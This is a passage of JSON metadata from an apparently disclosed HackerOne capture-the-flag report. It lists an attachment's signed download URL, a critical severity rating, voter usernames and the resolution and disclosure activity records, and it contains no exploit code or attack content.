      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/687/5edd6fc76f0a9fe0b5dc63741aca3de15cc79db1/main_1.py?response-content-disposition=attachment%3B%20filename%3D%22main_1.py%22%3B%20filename%2A%3DUTF-8%27%27main_1.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074420Z&X-Amz-Expires=1969&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c636f5b5ef1b01d81f5ec209cc7fe1975d973b8a18df7e5d92dfd8751fe851e9",
      "file_size": 2367,
      "type": "text/x-python",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-05-08T15:55:42.852Z",
  "allow_singular_disclosure_after": -138124117.77695668,
  "singular_disclosure_allowed": true,
  "vote_count": 10,
  "voters": [
    "checkm50",
    "ajxchapman",
    "0xacb",
    "ali",
    "0x08",
    "sinswriter",
    "sorted_one",
    "pchibuzor",
    "daringkid",
    "victoracd"
  ],
  "severity": {
    "rating": "critical",
    "score": 10.0,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 4492844,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.",
      "automated_response": false,
      "created_at": "2019-04-05T18:33:59.686Z",
      "updated_at": "2019-04-05T18:33:59.686Z",
      "actor": {
        "username": "daeken",
        "cleared": false,
        "verified": false,
        "url": "/daeken",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "ajxchapman",
        "url": "/ajxchapman"
      },
      "genius_execution_id": null,
      "team_handle": "50m-ctf"
    },
    {
      "id": 4509091,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-04-08T15:55:42.813Z",
      "updated_at": "2019-04-08T15:55:42.813Z",
      "first_to_agree": true,
      "actor": {
        "username": "daeken",
        "cleared": false,
        "verified": false,
        "url": "/daeken",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "50m-ctf"
    },
    {
      "id": 4509092,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ManuallyDisclosed",
      "message": "",
      "automated_response": false,
      "created_at": "2019-04-08T15:55:48.766Z",
      "updated_at": "2019-04-08T15:55:48.766Z",
      "actor": {
        "username": "daeken",
        "cleared": false,
        "verified": false,
        "url": "/daeken",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "50m-ctf"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}